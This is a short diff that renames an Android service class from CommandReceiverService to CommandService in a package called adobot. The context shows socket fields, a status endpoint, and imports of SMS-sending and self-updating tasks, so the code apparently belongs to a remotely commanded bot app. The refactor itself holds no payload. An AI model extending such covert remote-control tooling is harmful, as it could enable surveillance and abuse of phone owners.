@@ -33,14 +33,14 @@ import com.android.adobot.tasks.SendSmsTask;
 import com.android.adobot.tasks.UpdateAppTask;
 
 
-public class CommandReceiverService extends Service {
+public class CommandService extends Service {
 
-    private static final String TAG = "CommandReceiverService";
+    private static final String TAG = "CommandService";
 
     private static final String POST_STATUS = "/status";
 
     private CommonParams params;
-    private CommandReceiverService client;
+    private CommandService client;
     private Socket socket;
     private boolean connected;
     private boolean registered;
